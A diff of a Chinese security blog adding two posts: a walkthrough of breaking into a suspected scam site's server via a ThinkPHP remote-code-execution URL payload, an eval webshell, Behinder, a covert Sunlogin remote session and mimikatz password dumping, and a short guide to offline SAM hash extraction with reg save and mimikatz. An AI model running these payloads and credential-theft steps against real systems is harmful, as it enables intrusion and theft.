+<h2 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h2><p>知道了对方用的CMS和框架后，可以尝试用漏洞测试工具对其进行测试。<br>ThinkPHP漏洞取证小助手一顿撸!<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150638444-2002532457.png" alt="image-20210816150638045"><br>哦吼，返回404？？？？这是怎么回事呢？ 让我看看。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150805152-942618794.png" alt="image-20210530145844566"><br>返回404说明主站的路径默认不在根目录，通过测试发现在public目录。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150815077-2116059478.png" alt="image-20210530150052092"><br>我去访问WebShell的时候，返回了奇怪的错误提示模块不存在public，我想这应该是我的Shell1.php写到了后端根目录，即<code>phpStudy\www\xxx\shell1.php</code>，而网站管理员设置了只能访问前端目录即<code>nginx\html\dist-xx\index.html</code>，所以访问时候就会报错显示404 无法访问。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816150917663-596583674.png" alt="image-20210816150917217"><br>（实验了下，确实前后端目录分离，在前端img目录下写入404.txt可正常访问到。）<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151116360-810544006.png" alt="image-20210531180824901"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151139779-938529109.png" alt="image-20210531180846255"><br>解决方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#管理员配置了我们只能访问public目录，那我们就用绝对路径的方式找到public目录，并且写入一句话。</span><br><span class="line">#由ThinkPHP报错得知，public绝对路径如下</span><br><span class="line">PUBLIC_PATH  D:\phpStudy\PHPTutorial\WWW\xx\public\</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151221583-1867892045.png" alt="image-20210530152452017"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151235114-111641459.png" alt="image-20210530152606303"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151245322-1478852002.png" alt="image-20210530152647511"><br>写入phpinfo</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1.php&amp;vars[1][]&#x3D;&lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>写入一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(xxxxxxxxx); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x03-一句话Shell"><a href="#0x03-一句话Shell" class="headerlink" title="0x03 一句话Shell"></a>0x03 一句话Shell</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151341165-695812818.png" alt="image-20210530152920940"> </p>
+<h2 id="0x04-冰蝎-内网渗透"><a href="#0x04-冰蝎-内网渗透" class="headerlink" title="0x04 冰蝎 内网渗透"></a>0x04 冰蝎 内网渗透</h2><p>冰蝎下载地址：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip</a><br>冰蝎 一句话Shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行冰蝎</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151357371-102688335.png" alt="image-20210530154310972"><br>服务器信息收集：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来查看开了哪些进程，一般判断有哪些防火墙、杀毒软件</span></span><br><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure>
+<p>将结果复制到这个网站中进行过滤<a target="_blank" rel="noopener" href="https://maikefee.com/av_list">https://maikefee.com/av_list</a></p>
+<h2 id="0x05-向日葵远控组合拳"><a href="#0x05-向日葵远控组合拳" class="headerlink" title="0x05 向日葵远控组合拳"></a>0x05 向日葵远控组合拳</h2><p>工具目录：</p>
+<ul>
+<li>sun.exe 向日葵</li>
+<li>ggg.exe 绕过向日葵安装</li>
+<li>new_mimi.exe 读取服务器密码</li>
+<li>de_sun.exe 向日葵密码解密工具 (这个可以不用上传到远程服务器)</li>
+</ul>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151421989-42248780.png" alt="image-20210530165312741"> </p>
+<p>将文件上传到 <code>C:/xxx/xxx/</code>目录<br>然后分别运行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/&gt; ggg.exe  <span class="comment">#让向日葵以绿色模式运行，无须安装</span></span><br><span class="line">C:/xxx/xxx/&gt; sun.exe  <span class="comment">#运行向日葵</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>重要！！！</p>
+<p>向注册表中写入向日葵安装信息成功，运行向日葵后无须安装。</p>
+</blockquote>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151431381-744914.png" alt="image-20210530165806676"> </p>
+<blockquote>
+<p>运行sun.exe 向日葵后，会在C:\ProgramData目录多出一个Oray目录（向日葵配置信息）。</p>
+<p>下载向日葵配置文件C:/ProgramData/Oray/SunloginClient/config.ini<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151447218-1031169864.png" alt="image-20210530170038380"><br>解析向日葵配置文件，提取验证码和密码</p>
+<p>验证码：xxxxx</p>
+<p>密码（加密）：gxfhaBnFFlQ=<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151507031-444365686.png" alt="image-20210530170228194"><br>在本机运行de_sun.exe，解密向日葵密码<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151557977-3317338.png" alt="image-20210530170417329"><br>向日葵</p>
+<p>伙伴识别码：xxxxx</p>
+<p>验证码：Tlm3S0</p>
+</blockquote>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151609868-742170837.png" alt="image-20210530170552978"><br>成功连接上了远程服务器的向日葵，但是需要账号密码解锁！<br>上传组合拳里面的 new_mimi.exe 到远程服务器，运行如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/ &gt;new_mimi.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151620028-226874935.png" alt="image-20210530170737867"><br>提取出账号密码</p>
+<blockquote>
+<p>远程服务器账号密码信息</p>
+<p>Username : Administrator<br>Domain   :<br>Password : 12345678911</p>
+</blockquote>
+<h2 id="0x06-利用成功"><a href="#0x06-利用成功" class="headerlink" title="0x06 利用成功"></a>0x06 利用成功</h2><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151636040-1318970692.png" alt="image-20210530170923013"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816151650462-1434249605.png" alt="image-20210530171012224"><br>：)可以看到管理员在偷偷看注册的用户信息，我确认了服务器管理员不在操作，于是进行了进一步取证，得到了管理员的真实ip地址，上面还有一个百度网盘，里面有管理员的账号信息，接下来就是将信息交给警察叔叔处理吧。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vxer-lee.github.io/2020/11/13/Forensics/mimikatz/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="VxerLee">
+      <meta itemprop="description" content="喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lee's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/13/Forensics/mimikatz/" class="post-title-link" itemprop="url">Mimikatz离线破解Windows登陆密码</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-13 11:50:11" itemprop="dateCreated datePublished" datetime="2020-11-13T11:50:11+08:00">2020-11-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-08-16 15:57:57" itemprop="dateModified" datetime="2021-08-16T15:57:57+08:00">2021-08-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Forensics/" itemprop="url" rel="index"><span itemprop="name">电子取证</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <meta name="referrer" content="no-referrer"/>
+
+
+<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>首先导出两个文件，可能需要管理员权限 ，CMD或者Powershell运行都可以。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144631614-387470361.png" alt="1"> </p>
+<p>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试</p>
+<p>mimikatz下载链接：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809</a></p>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144641018-1570866180.png" alt="2"> </p>
+<p>运行mimikatz，输入命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144703067-2076311006.png" alt="ntlm"><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816144709916-651092097.png" alt="123456"> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
 
-              </div>
-            </div>
           </div>
-        </div>
-      </div>
-    
+          
 
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
 
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
   </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">VxerLee</p>
+  <div class="site-description" itemprop="description">喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot</div>
 </div>
-    
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
 
-    
-  </main>
 
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">VxerLee</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
-  
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
 
   
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-  
-</footer>
+<script src="/js/utils.js"></script>
 
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+<script src="/js/motion.js"></script>
 
 
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
+<script src="/js/schemes/muse.js"></script>
 
 
-  <script  src="/js/local-search.js" ></script>
+<script src="/js/next-boot.js"></script>
 
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
 
 
 
@@ -854,16 +1783,6 @@ net start 命令
 
 
 
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
 
 
 
@@ -871,17 +1790,9 @@ net start 命令
 
 
 
+  
 
-
-
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
+  
 
 </body>
 </html>
